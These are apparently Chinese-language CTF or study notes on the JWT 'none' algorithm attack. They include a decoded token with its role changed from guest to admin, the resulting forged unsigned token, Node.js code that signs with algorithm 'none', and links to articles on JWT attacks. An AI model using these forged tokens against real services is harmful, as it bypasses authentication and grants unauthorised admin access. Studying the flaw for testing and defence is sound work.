# 空加密

## 示例 1

admin admin 登陆 jwt 值为

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJndWVzdCJ9.1tg4f5ZwANJCK8gAzI1gL1-yGoB4DS8OXQDKXJRd-YU
```

格式为 `[算法].[Payload].[签名]`

| 修改前                                                 | 修改后                                                 |
| ------------------------------------------------------ | ------------------------------------------------------ |
| {"typ":"JWT","alg":"HS256"}                            | {"typ":"JWT","alg":`"none"`}                             |
| {"username":"admin","password":"admin","role":"guest"} | {"username":"admin","password":"admin","role":`"admin"`} |

算法替换为 "none", 然后转换回base64, 可以丢掉签名。

`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.`

## 示例 2

nodejs 中的 jwt 库在签名时用 algorithm 指定算法，而在验签时用 algorithms 指定算法
在测试 jwt 相关的安全问题时可以使用 burpsuite 的 JOSEPH 插件辅助测试

```ts
// https://www.secpulse.com/archives/129304.html
// https://blog.csdn.net/miuzzx/article/details/127744431#t1
const jwt = require("jsonwebtoken")

var payload = {
  secretid: [],
  username: "admin"
}
var token = jwt.sign(payload, undefined, { algorithm: "none" })
console.log(token)
```

# Article

[浅析 JWT Attack](https://mp.weixin.qq.com/s/WvVgavjJMXSZQsVFtHEOhA)
[JWT 相关题目刷题](https://mp.weixin.qq.com/s/Ss9Oc2ZN7qFboBWaXfrDLA)
[『红蓝对抗』JWT 攻击手法](https://mp.weixin.qq.com/s/OVppZClKRWP8zNEBjZPRow)
[JWT 攻击手法——1](https://mp.weixin.qq.com/s/kkoskD6d69G59bRK8nyUdw)
[API | JWT渗透姿势](https://mp.weixin.qq.com/s/1e94h4NFiIbVDMiIXtjgGQ)
[揭示JWT开放标准的认证安全问题](https://mp.weixin.qq.com/s/sUWKlmCFJn8cuZgjcbJANg)
